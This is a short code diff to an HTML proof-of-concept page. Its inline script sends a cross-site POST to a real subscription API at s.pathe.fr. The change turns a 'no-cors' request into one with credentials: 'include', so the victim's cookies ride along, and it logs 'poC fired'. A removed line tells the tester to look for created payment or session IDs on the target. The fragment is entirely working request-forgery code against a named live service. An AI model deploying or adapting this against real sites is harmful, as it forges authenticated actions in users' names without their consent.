@@ -32,13 +32,16 @@
       });
 
       fetch('https://s.pathe.fr/subscription/api/1.0.0/lead?language=en', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: payload
-      });
-      document.body.append('PoC dispatched (no-cors). Check target for created payment_id/session_id.');
+         method: 'POST',
+         credentials: 'include',   // <— request cookies be sent
+         headers: { 'Content-Type': 'application/json' },
+         body: payload
+       })
+       .then(()=>console.log('poC fired'))
+       .catch(e=>console.log('fetch error', e));
     </script>
   </body>
 </html>
+
 
 
